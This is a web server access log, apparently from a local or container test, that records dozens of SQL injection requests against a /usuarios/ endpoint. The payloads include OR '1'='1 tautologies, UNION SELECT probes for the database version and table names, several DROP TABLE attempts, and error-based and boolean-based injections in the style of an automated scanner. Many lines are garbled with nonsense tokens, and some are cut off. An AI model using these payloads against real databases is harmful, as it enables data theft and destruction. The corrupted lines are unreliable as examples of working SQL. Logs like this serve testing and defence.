Servidor rodando em http://0.0.0.0:8000
172.18.0.1 - GET /usuarios/test'%20OR%20'1'='1%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$tyly,%20)%20and%20(%20'i'%20=%20'i HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(count%20()%20),%20)%20,version%20(%20,%20)%20--%201 HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20(%20,%20users,gverpabp_race);%20valies%20(%201%20,%20(%201,1,%20)%20)%20,%201%20)%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,matebemale_sate_qelse%20NuLE%20;)%20;%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20charaller/**/ HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(count%20(%20)%20,%20select%20@@verseon,%20)%20)%20,1%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',%20)%20,1,1%20)%20)%20=%201%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(char.%20lybe_taber'%20)%20;%3E%20Greep%20_sybe_tes%20(%20LikE%20(SElECt%200x0b101) HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20-%20Table_name(chr%20(%20113%20)%20+char%20(%20113%20)%20+char%20(%20112%20)%20+char%20(%20106%20)%20+char%20(%20113%20)%20+%20(%20select%20(%20case%20when%20(%202724%20=%202724%20)%20then%20char%20(%2049%20)%20else%20char%20(%2048%20)%20end%20)%20)%20+char%20(%20113%20)%20+char%20(%20122%20)%20+char%20(%20118%20)%20+char%20(%20122%20)%20+char%20(%2011 HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(count%20(%20)%20,%20select%20@@version,%20)%20/**/ HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20userschart'lame%20(%20tro$%20usersiones%20as%20awable%20)%20; HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@(%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20table_name'%20)%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20-%20Table_name,%20DiRclop%20pross_BRoWLEr_%20(%200x1,0b0b0b10000101011011101100101010010000101001010111010101110 HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20verseoncmant%20iDe%20LIcE%20&&(SELECT%20(SELECT%20(SELECT%200x1)))%20--%201 HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,alectame%20')%20,%20and%20'capt'+inc;;;; HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,wame_terselempipeppepable%20tablename%20than%20thas HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20colversint%20table%20and%20'%20)%20=%20'1'%20/**/ HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20verseoncmane%20)%20(%3C@@@@@$,seserted%20--%200o0o1'%20)%20THEN%200x45d7%20elSE%20(SElECt%20(sEleCt%20(SELECT%20(SELECT%20(SELECT)))) HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made,call%20ing_nema) HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentybes%20lyat%201%20Fiom%20)%20;%20and%20thoping%20(121,%20)%201%20and%20'swit'%20like%20'swit HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20columnt%20anl/**/ HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20verseoncmane%20(%20'DbO'%20DI HTTP/1.1
172.18.0.1 - GET /usuarios/test';%20DROP%20TABLE%20(%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test';%20DROP%20TABLE%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test';%20DROP%20TABLE%20SEM HTTP/1.1
172.18.0.1 - GET /usuarios/test';%20DROP%20TABLE%20SE HTTP/1.1
172.18.0.1 - GET /usuarios/test';%20DROP%20TABLE%201%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test%22%20OR%20%221%22=%221%22%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test1'%7C%7C%20(%20select%20'fjcg'%20from%20dual%20where%204587%20=%204587%20or%20row%20(%201045,7562%20)%20%3E%20(%20select%20count%20(%20*%20)%20,concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%201045%20=%201045,1%20)%20)%20)%20,0x717a767a71,floor%20(%20rand%20(%200%20)%20*2%20)%20)%20x%20from%20(%20s HTTP/1.1
172.18.0.1 - GET /usuarios/test-2929'%20)%20)%20)%20or%205903%20=%20(%20'qqpjq'%7C%7C%20(%20select%20case%205903%20when%205903%20then%201%20else%200%20end%20from%20rdb$database%20)%20%7C%7C'qzvzq'%20)%20and%20(%20(%20(%20'nzmk'%20=%20'nzmk HTTP/1.1
172.18.0.1 - GET /usuarios/test-2982%22%20or%201570%20=%20convert%20(%20int,%20(%20select%20char%20(%20113%20)%20+char%20(%20113%20)%20+char%20(%20112%20)%20+char%20(%20106%20)%20+char%20(%20113%20)%20+%20(%20select%20(%20case%20when%20(%201570%20=%201570%20)%20then%20char%20(%2049%20)%20else%20char%20(%2048%20)%20end%20)%20)%20+char HTTP/1.1
172.18.0.1 - GET /usuarios/test1'%20)%20)%20as%20hqhs%20where%205383%20=%205383 HTTP/1.1
